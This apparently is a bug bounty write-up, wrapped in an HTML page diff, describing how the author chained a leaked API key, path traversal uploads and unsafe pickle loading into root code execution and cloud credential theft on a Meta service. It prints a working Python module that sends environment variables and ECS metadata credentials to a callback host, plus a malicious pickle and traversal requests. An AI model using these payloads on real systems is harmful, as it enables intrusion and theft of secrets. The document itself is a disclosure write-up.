@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Root shell, full AWS and GCP, and 17 secrets on a Meta service · zonduu</title>
+  <meta name="description" content="Chaining a hardcoded API key and two path traversals into pickle deserialization for remote code execution as root on a Meta service, then pulling AWS creds, GCP service accounts and 17 secrets." />
+  <meta name="theme-color" content="#0d0e10" />
+  <meta property="og:type" content="article" />
+  <meta property="og:title" content="Root shell, full AWS and GCP, and 17 secrets on a Meta service" />
+  <meta property="og:description" content="A hardcoded key plus two path traversals plus an unsafe pickle load, chained into root RCE and a full cloud compromise on a Meta service." />
+  <link rel="icon" href="/assets/img/avatar.jpg" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="/assets/css/style.css" />
+</head>
+<body>
+  <header class="site-header">
+    <div class="wrap site-header__inner">
+      <a class="logo" href="/">
+        <span class="logo__prompt">&gt;</span>
+        <span>root@zonduu:~#</span>
+        <span class="logo__cursor" aria-hidden="true"></span>
+      </a>
+      <nav class="nav" aria-label="Primary">
+        <a href="/">home</a>
+        <a href="/posts/">posts</a>
+        <span class="nav__icons">
+          <a href="https://twitter.com/zonduu1" target="_blank" rel="noopener" title="Twitter" aria-label="Twitter">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"/></svg>
+          </a>
+        </span>
+      </nav>
+    </div>
+  </header>
+
+  <main>
+    <div class="wrap wrap--reading page-title">
+      <a class="back-link" href="/posts/">&lt; ~/posts</a>
+      <h1>Root shell, full AWS and GCP, and 17 secrets on a Meta service</h1>
+      <div class="post-meta">
+        <span>May 8, 2026</span>
+        <span class="dot">•</span>
+        <span>9 min read</span>
+        <span class="dot">•</span>
+        <span>#rce</span>
+        <span>#aws</span>
+        <span>#gcp</span>
+      </div>
+    </div>
+
+    <article class="wrap wrap--reading prose">
+      <p>I found this at Meta's live hacking event in Taiwan, which I was invited to. I chained a
+      hardcoded API key with two path traversals and an unsafe pickle load to get code execution as
+      root on a Meta service, and from there I pulled the container's AWS credentials, two GCP
+      service accounts, and every secret in the account. I will also be honest about how it ended,
+      because the payout was not what I expected.</p>
+
+      <blockquote><p>Quick note before anything: every credential in this write-up is truncated
+      or masked, and all of them were rotated and revoked a long time ago. Nothing here is live.</p></blockquote>
+
+      <h2>The target</h2>
+      <p>The asset was a GraphRAG service that was part of Meta's AI meeting and assistant stack,
+      living at <code>REDACTED.aws.metafb.cloud</code>. It runs on AWS
+      ECS Fargate. It was part of the event's special scope, which is the kind that carries a 20%
+      bonus on top of the normal bounty. As the hostname hints, it was also a development
+      environment, and I will come back to that word later because it ended up mattering a lot.</p>
+
+      <h2>A lot of nothing, then a key in the JavaScript</h2>
+      <p>We spent the first stretch of the event just crawling the target. Mapping subdomains,
+      walking every endpoint we could reach, throwing the usual things at every input we found.
+      For a good while it was quiet. None of the easy wins were there, and it was starting to feel
+      like one of those targets that just does not give anything up.</p>
+      <p>Then a slower pass over the front end turned something up. One of the Next.js chunks had
+      an API key hardcoded right there in the client-side JavaScript.</p>
+
+      <div class="code">
+        <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>http</span><button class="code__copy" type="button">copy</button></div>
+        <pre><code>GET /_next/static/chunks/5314-8d2abfc6a63fb291.js HTTP/1.1
+Host: REDACTED.aws.metafb.cloud</code></pre>
+      </div>
+
+      <p>Buried in that file:</p>
+
+      <div class="code">
+        <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>text</span><button class="code__copy" type="button">copy</button></div>
+        <pre><code>FAST_GRAPHRAG_API_KEY = apprunner_fast_graphrag_fgr_k3y_8x4n9p2q...</code></pre>
+      </div>
+
+      <p>That key was the entry ticket to the GraphRAG endpoints, so the interesting parts of the
+      app were now reachable. On its own a leaked key like this is usually a low or medium finding.
+      The fun started when I looked at what those endpoints actually let me do.</p>
+
+      <h2>A file write, then a path traversal</h2>
+      <p>With the key working, the GraphRAG endpoints were worth going through one at a time to see
+      what each one actually did. The one that stood out was <code>load_datasources</code>. It
+      takes a <code>project_path</code> and a set of uploaded files, and it auto-creates
+      <code>{project_path}/input/</code> before saving them. So right there, a file write, which is
+      already worth a closer look.</p>
+      <p>The real problem was that the <code>filename</code> field was never sanitized. A filename
+      like <code>../../something.py</code> escapes the <code>input/</code> folder and climbs back
+      up the tree, which turns a normal upload into an arbitrary file write. If I pointed
+      <code>project_path</code> at the installed package directory, I could land a file straight
+      into Python's <code>site-packages</code>, which is on the module search path. That is the
+      pair that made this dangerous: an upload, plus a traversal to put the upload anywhere I
+      wanted.</p>
+
+      <p>The payload was a small Python module that grabs the container environment and the ECS
+      task role credentials and beacons them out to an external callback server.</p>
+
+      <div class="code">
+        <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>python · h1_rce_module4.py</span><button class="code__copy" type="button">copy</button></div>
+        <pre><code>import os, urllib.request, base64, json
+
+CALLBACK = "http://YOUR_CALLBACK_DOMAIN"
+
+try:
+    env = dict(os.environ)
+    creds_uri = env.get("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI", "")
+    aws_creds = ""
+    if creds_uri:
+        aws_creds = urllib.request.urlopen(
+            "http://169.254.170.2" + creds_uri, timeout=5
+        ).read().decode()
+    urllib.request.urlopen(
+        CALLBACK + "/env?d=" + base64.b64encode(json.dumps(env).encode()).decode(),
+        timeout=10,
+    )
+    if aws_creds:
+        urllib.request.urlopen(
+            CALLBACK + "/awscreds?d=" + base64.b64encode(aws_creds.encode()).decode(),
+            timeout=10,
+        )
+except Exception as e:
+    urllib.request.urlopen(
+        CALLBACK + "/err?e=" + base64.b64encode(str(e).encode()).decode(), timeout=5
+    )</code></pre>
+      </div>
+
+      <p>That module went up with a traversing filename so it lands directly in
+      <code>site-packages</code>:</p>
+
+      <div class="code">
+        <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>http</span><button class="code__copy" type="button">copy</button></div>
+        <pre><code>POST /graphene/graph/load_datasources HTTP/1.1
+Host: REDACTED.aws.metafb.cloud
+X-API-Key: apprunner_fast_graphrag_fgr_k3y_8x4n9p2q...
+Content-Type: multipart/form-data; boundary=----boundary
+
+------boundary
+Content-Disposition: form-data; name="project_path"
+
+/usr/local/lib/python3.11/site-packages/fast_graphrag
+------boundary
+Content-Disposition: form-data; name="files"; filename="../../h1_rce_module4.py"
+Content-Type: text/plain
+
+[module content]
+------boundary--</code></pre>
+      </div>
+
+      <p>The server happily reported success and even handed me the resolved path back, which
+      confirmed the traversal worked:</p>
+
+      <div class="code">
+        <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>json</span><button class="code__copy" type="button">copy</button></div>
+        <pre><code>{
+  "status": "success",
+  "message": "Successfully loaded 1 files",
+  "files": [{
+    "filename": "../../h1_rce_module4.py",
+    "path": ".../fast_graphrag/input/../../h1_rce_module4.py"
+  }]
+}</code></pre>
+      </div>
+
+      <p>That path collapses down to
+      <code>/usr/local/lib/python3.11/site-packages/h1_rce_module4.py</code>. My file was now
+      importable. But writing a file is not the same as running it. I needed something to actually
+      import it.</p>
+
+      <h2>Turning that write into code execution (the hard part)</h2>
+      <p>This is where I lost the most time. A file write is not code execution. A Python file can
+      sit in <code>site-packages</code> all day, but nothing runs it unless something on the server
+      actually imports or loads it. Getting from "files can be written" to "the code runs" took a
+      handful of attempts and a few hypotheses that went nowhere before one finally stuck.</p>
+      <p>The one that worked was the <code>/visualize</code> endpoint. It loads a file called
+      <code>graph_igraph_data.pklz</code> with <code>pickle.loads()</code>, with no signature
+      check, and the <code>dataset</code> parameter that decides which folder to read from is
+      itself path traversable. Unsafe pickle deserialization is a classic code execution primitive,
+      because pickle lets an object define what happens when it is unpickled.</p>
+
+      <p>The trigger was a tiny pickle whose only job on load is to import the module. Importing it
+      is what runs the beacon code above, because Python runs a module's top level the first time it
+      is imported.</p>
+
+      <div class="code">
+        <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>python</span><button class="code__copy" type="button">copy</button></div>
+        <pre><code>import pickle, gzip
+
+class RCE:
+    def __reduce__(self):
+        return (__import__, ("h1_rce_module4",))
+
+open("graph_igraph_data.pklz", "wb").write(gzip.compress(pickle.dumps(RCE())))
+# 75 bytes</code></pre>
+      </div>
+
+      <p>That pickle went into the package directory (one level of traversal this time), and the
+      load fired by pointing the <code>dataset</code> parameter back up the tree into
+      <code>site-packages</code>:</p>
+
+      <div class="code">
+        <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>http</span><button class="code__copy" type="button">copy</button></div>
+        <pre><code>GET /visualize?dataset=../../../../../usr/local/lib/python3.11/site-packages HTTP/1.1
+Host: REDACTED.aws.metafb.cloud
+X-API-Key: apprunner_fast_graphrag_fgr_k3y_8x4n9p2q...</code></pre>
+      </div>
+
+      <p>The response was a 500 and nothing else useful. After my code runs, the server tries to
+      render the result as a graph, chokes on it, and throws. That is the whole catch with this
+      one: it was a blind RCE. The response never carried any command output, so from the outside
+      I had no way to see whether my code had actually run. Anything I wanted to confirm, or pull
+      out, had to come back through a side channel.</p>
+
+      <p>It also took a few tries to get right, and two things in particular kept tripping me up:</p>
+      <ul>
+        <li>Python caches imports in <code>sys.modules</code>. If you import the exact same module
+        name twice, the second import does nothing. That is why the module gets a fresh name each
+        run (<code>module4</code>, <code>module10</code>, and so on).</li>
+        <li>You have to count the <code>../</code> jumps correctly. One off and you land on a path
+        that does not exist and get a clean 404 instead of the 500 that means it fired.</li>
+      </ul>
+
+      <h2>The side channel: proof it ran, as root</h2>
+      <p>Because it was blind, the module did all of its work in place and mailed the results back
+      to me. It read the container environment and the ECS task role credentials from the metadata
+      service, base64 encoded them, and sent them as plain HTTP requests to a callback host I
+      controlled (I used an Interactsh server). No callback meant the attempt had failed. A
+      callback meant my code had run and the data was already on its way out. That is the whole
+      exfil trick with a blind bug: when you cannot read the response, you make the server come
+      talk to you.</p>
+      <p>It ran. My callback server lit up with hits from <code>34.212.88.131</code>, which is
+      Meta's AWS us-west-2 range on ECS Fargate. The container was running as root.</p>
+
+      <div class="code">
+        <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>text</span><button class="code__copy" type="button">copy</button></div>
+        <pre><code>uid=0(root) gid=0(root) groups=0(root)
+host=ip-10-0-249-248.us-west-2.compute.internal</code></pre>
+      </div>
+
+      <p>The environment beacon gave me everything I needed to pivot into AWS, including the path
+      to the container credentials endpoint:</p>
+
+      <div class="code">
+        <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>json · container env</span><button class="code__copy" type="button">copy</button></div>
+        <pre><code>{
+  "DATASET_BUCKET": "georgelivekitfastgraphrag-livekitfastgraphragdatas-...",
+  "HOSTNAME": "ip-10-0-249-248.us-west-2.compute.internal",
+  "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI": "/v2/credentials/415696df-...",
+  "AWS_EXECUTION_ENV": "AWS_ECS_FARGATE",
+  "AWS_DEFAULT_REGION": "us-west-2",
+  "DATASET_TABLE": "fastgraphragDatasets"
+}</code></pre>
+      </div>
+
+      <p>My module read <code>http://169.254.170.2</code> plus that relative URI and pulled the
+      ECS task role credentials straight out of the metadata service.</p>
+
+      <h2>What the AWS credentials unlocked</h2>
+      <p>A blind RCE and a screenshot of a callback is easy for a program to wave away, so the
+      point now was to show exactly how far the access went. The exfiltrated credentials, exported
+      locally, were enough to start confirming real access, with a small harmless proof artifact
+      left at each step so none of it was just a claim. The identity checked out as a Meta AWS
+      account:</p>
+
+      <div class="code">
+        <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>bash</span><button class="code__copy" type="button">copy</button></div>
+        <pre><code>$ aws sts get-caller-identity
+{
+  "Account": "571415640035",
+  "Arn": "arn:aws:sts::571415640035:assumed-role/GeorgeLiveKitFastGraphRag-...Siz85aztIBBM/..."
+}</code></pre>
+      </div>
+
+      <p>From there the blast radius opened up fast:</p>
+      <ul>
+        <li><strong>S3, read and write.</strong> The dataset bucket held 398 objects covering
+        3,289 AI calling sessions, which is the actual meeting transcripts and graph data for real
+        user sessions. Both readable, and write access confirmed by dropping a harmless proof
+        file.</li>
+        <li><strong>DynamoDB, read and write.</strong> The <code>fastgraphragDatasets</code> table
+        had 3,289 records and accepted a proof item written into it.</li>
+        <li><strong>Secrets Manager, full read.</strong> All 17 secrets in the account came back.</li>
+      </ul>
+
+      <p>A quick look at a transcript to confirm what this data actually was:</p>
+
+      <div class="code">
+        <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>text · sample transcript from S3</span><button class="code__copy" type="button">copy</button></div>
+        <pre><code># AI Assistance Session Summary
+## Overview
+Brief initial greeting from AI assistant Morgan, offering help.
+- Morgan introduced themselves as an "AI teammate"
+- No action items were generated</code></pre>
+      </div>
+
+      <h2>The 17 secrets</h2>
+      <p>This is where a container compromise turned into something that reaches well past one box.
+      Values below are cut down to a recognizable prefix on purpose.</p>
+
+      <div class="table-scroll">
+      <table>
+        <thead><tr><th>Secret</th><th>What it was</th><th>Value (masked)</th></tr></thead>
+        <tbody>
+          <tr><td>fb_client_secret</td><td>Facebook / Meta OAuth client secret</td><td><code>d339105d62...</code></td></tr>
+          <tr><td>okta/client-secret</td><td>Okta OAuth client secret (SSO)</td><td><code>CkX9-d_Sm3m_8w8...</code></td></tr>
+          <tr><td>JWT_SECRET</td><td>JWT signing key (token forgery for any user)</td><td><code>3f86cb0ce647...</code></td></tr>
+          <tr><td>OPENAI_API_KEY</td><td>OpenAI service account key</td><td><code>sk-svcacct-lbao3chk...</code></td></tr>
+          <tr><td>LIVEKIT_API_KEY</td><td>LiveKit key (join or record any room)</td><td><code>APINyqJDF...</code></td></tr>
+          <tr><td>LIVEKIT_API_SECRET</td><td>LiveKit secret</td><td><code>25bthQhnBsrL...</code></td></tr>
+          <tr><td>livekit/creds</td><td>Second LiveKit key and secret pair</td><td><code>Rag_livekit / A9R4xE1v...</code></td></tr>
+          <tr><td>livekit/api-credentials</td><td>LiveKit API keys (yaml bundle of the primary key)</td><td><code>APINyqJDF... / 25bthQhnBsrL...</code></td></tr>
+          <tr><td>matrix/livekit/credentials</td><td>Third LiveKit key and secret pair</td><td><code>APIAaNRnLwqMHWL / l5jGXGQt...</code></td></tr>
+          <tr><td>gcp</td><td>GCP service account <code>sso-admin@xr-insight-experiences</code></td><td><code>private_key_id f9129071...</code></td></tr>
+          <tr><td>GOOGLE_APPLICATION_CREDENTIALS</td><td>GCP service account <code>vertex-ai-de-service-account@xr-insight-experiences</code></td><td><code>private_key_id 1baf9ea6...</code></td></tr>
+          <tr><td>MORGAN_SERVICE_KEY</td><td>Internal Morgan service key</td><td><code>MG_3nB8xC1v...</code></td></tr>
+          <tr><td>MORGANA_API_KEY</td><td>Internal Morgana key</td><td><code>apprunner_fast_graphrag...</code></td></tr>
+          <tr><td>SPEECH_ASSISTANT_SERVICE_KEY</td><td>Internal speech assistant key</td><td><code>SA_7kX9mP2q...</code></td></tr>
+          <tr><td>QUANTIFIED_SELF_API_KEY</td><td>Internal service key</td><td><code>qs_secret_upload_...</code></td></tr>
+          <tr><td>SERPAPI_KEY</td><td>SerpAPI key</td><td><code>3f49fd8b134e...</code></td></tr>
+          <tr><td>FAST_GRAPHRAG_API_KEY</td><td>The GraphRAG app key, the same one leaked in the JS</td><td><code>apprunner_fast_graphrag_fgr_k3y...</code></td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <p>The two GCP service accounts were the part that worried me most, because they moved the
+      whole thing out of AWS and into Google Cloud. One of them was named
+      <code>sso-admin</code>. I did not go poking at Meta's Google Workspace, but a service account
+      with that name is exactly the kind of key you flag loudly, because if it can manage SSO or
+      SAML config, that is its own critical path. I validated that the keys were live by activating
+      one locally and printing an access token:</p>
+
+      <div class="code">
+        <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>bash</span><button class="code__copy" type="button">copy</button></div>
+        <pre><code>export GOOGLE_APPLICATION_CREDENTIALS="key.json"
+gcloud auth activate-service-account --key-file="$GOOGLE_APPLICATION_CREDENTIALS"
+gcloud auth print-access-token
+# ya29.c.c0AZ4bNpbTM7c5Q1... (valid)</code></pre>
+      </div>
+
+      <p>So the final tally from one leaked front-end key: root code execution on the container,
+      the container's AWS role, read and write over 3,289 real session transcripts in S3 and
+      DynamoDB, and 17 secrets including live OAuth client secrets, a JWT signing key, and two GCP
+      service accounts.</p>
+
+      <h2>Timeline</h2>
+      <p>The response was genuinely fast. From the first report to the credentials starting to get
+      pulled was a single overnight window.</p>
+
+      <div class="table-scroll">
+      <table>
+        <thead><tr><th>When</th><th>What happened</th></tr></thead>
+        <tbody>
+          <tr><td>Apr 19, 4:53 PM</td><td>Reported.</td></tr>
+          <tr><td>Apr 19, 6:21 PM</td><td>Initial evaluation by a Meta security team member.</td></tr>
+          <tr><td>Apr 19, 10:45 PM</td><td>They asked for the full PoC and the raw, untruncated secrets.</td></tr>
+          <tr><td>Apr 19, 10:48 PM</td><td>Full PoC and secrets sent.</td></tr>
+          <tr><td>Apr 20, ~4:40 AM</td><td>The credentials started dying while I was still writing comments. The devs were already rotating them. Fixed in hours.</td></tr>
+          <tr><td>May 8</td><td>Bounty.</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <h2>The part I did not see coming</h2>
+      <p>I asked early on how Meta pays, because I was new to their program and I honestly thought
+      this was a big one. On some platforms a max severity finding pays a max bounty, and a zero
+      interaction account takeover class bug can pay six figures. Their answer was fair and
+      measured. They said they reward based on impact, that they run their own impact
+      investigation beyond what a researcher can confirm from the outside, that they had
+      historically seen little exposure on AWS, and that it would take about a week to calculate.</p>
+
+      <p>The decision came back at a <strong>$500</strong> bounty, plus a <strong>$25</strong>
+      Hacker Plus bonus, for a total of <strong>$525</strong>. The reasoning was that this was a
+      development environment.</p>
+
+      <p>I will be honest, this one left a bad taste. Root on the box, the container's AWS role,
+      read and write over 3,289 real meeting transcripts, two GCP service accounts including one
+      called sso-admin, and 17 secrets with live OAuth client secrets and a JWT signing key sitting
+      in the same account. All of it proven, not theory. And the whole thing came down to $525
+      because someone had labeled the box "dev".</p>
+
+      <p>The part that actually got to me was that there was nothing I could do about it. You do
+      not get to negotiate impact. The program decides what your finding was worth, tells you the
+      number, and that is the end of it. I pushed back, I laid out exactly how far the access went,
+      and it did not move a cent. Full code execution and a complete cloud compromise on Meta
+      infrastructure, and I was left staring at a payout that would not cover a decent monitor,
+      with no way to argue it into anything else. That is the part of bug bounty nobody really
+      warns you about.</p>
+
+      <p>Anyway. That is the write-up. The next one is on Twitter at
+      <a href="https://twitter.com/zonduu1" target="_blank" rel="noopener">@zonduu1</a>.</p>
+
+      <div class="post-footer">
+        <a class="back-link" href="/posts/">&lt; all posts</a>
+        <span class="post-meta" style="margin:0"><span>· zonduu</span></span>
+      </div>
+    </article>
+  </main>
+
+  <footer class="site-footer">
+    <div class="wrap site-footer__inner">
+      <span>© <span data-year>2020</span> zonduu</span>
+      <span><a href="/posts/">← posts</a></span>
+    </div>
+  </footer>
+  <script src="/assets/js/main.js"></script>
+</body>
+</html>
